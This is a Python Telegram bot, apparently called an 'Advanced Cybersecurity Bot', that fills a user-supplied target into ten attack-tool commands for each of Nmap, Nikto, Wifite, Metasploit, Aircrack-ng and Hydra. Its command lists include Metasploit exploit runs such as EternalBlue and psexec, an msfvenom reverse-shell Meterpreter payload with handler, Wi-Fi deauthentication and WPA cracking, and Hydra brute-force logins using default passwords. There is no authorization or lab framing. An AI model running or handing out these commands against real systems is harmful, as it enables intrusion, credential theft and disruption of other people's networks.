from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext

# Conversation states
TOOL_SELECTION, PARAM_INPUT = range(2)

# Start command
def start(update: Update, context: CallbackContext) -> int:
    reply_keyboard = [['Nmap', 'Nikto', 'Wifite', 'Metasploit', 'Aircrack-ng', 'Hydra']]
    update.message.reply_text(
        "Welcome to the Advanced Cybersecurity Bot!\n"
        "Choose a tool to generate commands:",
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
    )
    return TOOL_SELECTION

# Tool selection handler
def tool_selection(update: Update, context: CallbackContext) -> int:
    selected_tool = update.message.text.lower()
    context.user_data['tool'] = selected_tool

    prompt = {
        'nmap': "Enter the target IP or domain for Nmap:",
        'nikto': "Enter the target URL for Nikto:",
        'wifite': "Enter the wireless interface (e.g., wlan0) for Wifite:",
        'metasploit': "Enter the target IP for Metasploit (or type 'generic' for framework commands):",
        'aircrack-ng': "Enter the path to the capture file for Aircrack-ng:",
        'hydra': "Enter the target IP or hostname for Hydra:"
    }.get(selected_tool, "Invalid tool. Please choose again.")

    update.message.reply_text(prompt)
    return PARAM_INPUT

# Generate 10 unique commands for the selected tool
def generate_commands(update: Update, context: CallbackContext) -> int:
    user_input = update.message.text
    tool = context.user_data.get('tool')
    commands = []

    if tool == 'nmap':
        commands = [
            f"nmap -A {user_input}",
            f"nmap -sV {user_input}",
            f"nmap -p- {user_input}",
            f"nmap --script=vuln {user_input}",
            f"nmap -O {user_input}",
            f"nmap -sS -T4 {user_input}",
            f"nmap -sU {user_input}",
            f"nmap -Pn {user_input}",
            f"nmap -sC {user_input}",
            f"nmap -f {user_input}"
        ]
    elif tool == 'nikto':
        commands = [
            f"nikto -h {user_input}",
            f"nikto -h {user_input} -ssl",
            f"nikto -h {user_input} -Tuning x",
            f"nikto -h {user_input} -C all",
            f"nikto -h {user_input} -timeout 5",
            f"nikto -h {user_input} -o report.html",
            f"nikto -h {user_input} -Display V",
            f"nikto -h {user_input} -maxtime 10m",
            f"nikto -h {user_input} -404code 404,403",
            f"nikto -h {user_input} -useragent 'Mozilla/5.0'"
        ]
    elif tool == 'wifite':
        commands = [
            f"sudo wifite --interface {user_input}",
            f"sudo wifite --kill --interface {user_input}",
            f"sudo wifite --wps --interface {user_input}",
            f"sudo wifite --wep --interface {user_input}",
            f"sudo wifite --wpa --interface {user_input}",
            f"sudo wifite --verbose --interface {user_input}",
            f"sudo wifite --dict /usr/share/wordlists/rockyou.txt --interface {user_input}",
            f"sudo wifite --client --interface {user_input}",
            f"sudo wifite --pixie --interface {user_input}",
            f"sudo wifite --crack --interface {user_input}"
        ]
    elif tool == 'metasploit':
        commands = [
            f"msfconsole -q -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {user_input}; run'",
            f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {user_input}; run'",
            f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={user_input} LPORT=4444 -f exe > shell.exe",
            f"msfconsole -q -x 'search type:exploit'",
            f"msfconsole -q -x 'use auxiliary/scanner/portscan/tcp; set RHOSTS {user_input}; run'",
            f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST {user_input}; run'",
            f"msfconsole -q -x 'use exploit/linux/samba/is_known_pipename; set RHOST {user_input}; run'",
            f"msfconsole -q -x 'db_nmap -sV {user_input}'",
            f"msfconsole -q -x 'use exploit/windows/smb/psexec; set RHOST {user_input}; run'",
            f"msfconsole -q -x 'sessions -i'"
        ]
    elif tool == 'aircrack-ng':
        commands = [
            f"aircrack-ng {user_input} -w /usr/share/wordlists/rockyou.txt",
            f"aircrack-ng {user_input} -b 00:11:22:33:44:55",
            f"airodump-ng {user_input}",
            f"airmon-ng start {user_input}",
            f"airodump-ng --bssid 00:11:22:33:44:55 -c 6 {user_input}",
            f"aireplay-ng --deauth 100 -a 00:11:22:33:44:55 {user_input}",
            f"aircrack-ng -e 'NetworkName' {user_input}",
            f"aircrack-ng -l cracked_keys.txt {user_input}",
            f"aircrack-ng -K {user_input}",
            f"aircrack-ng --help"
        ]
    elif tool == 'hydra':
        commands = [
            f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {user_input} ssh",
            f"hydra -V -l admin -p password {user_input} ftp",
            f"hydra -L users.txt -P passwords.txt {user_input} http-post-form",
            f"hydra -l root -p toor {user_input} mysql",
            f"hydra -l admin -p 123456 {user_input} rdp",
            f"hydra -s 2222 -l admin -P passwords.txt {user_input} ssh",
            f"hydra -vV -l user -P passlist.txt {user_input} smb",
            f"hydra -l admin -p admin123 {user_input} telnet",
            f"hydra -F -l admin -p password {user_input} vnc",
            f"hydra -h"
        ]
    else:
        update.message.reply_text("Invalid tool selected.")
        return ConversationHandler.END

    response = "\n".join([f"{i+1}. `{cmd}`" for i, cmd in enumerate(commands)])
    update.message.reply_text(f"Here are 10 generated commands for {tool}:\n\n{response}", parse_mode="Markdown")
    return ConversationHandler.END

def main():
    updater = Updater("YOUR_BOT_TOKEN", use_context=True)
    dp = updater.dispatcher
    conv_handler = ConversationHandler(entry_points=[CommandHandler('start', start)], states={TOOL_SELECTION: [MessageHandler(Filters.text & ~Filters.command, tool_selection)], PARAM_INPUT: [MessageHandler(Filters.text & ~Filters.command, generate_commands)]}, fallbacks=[])
    dp.add_handler(conv_handler)
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
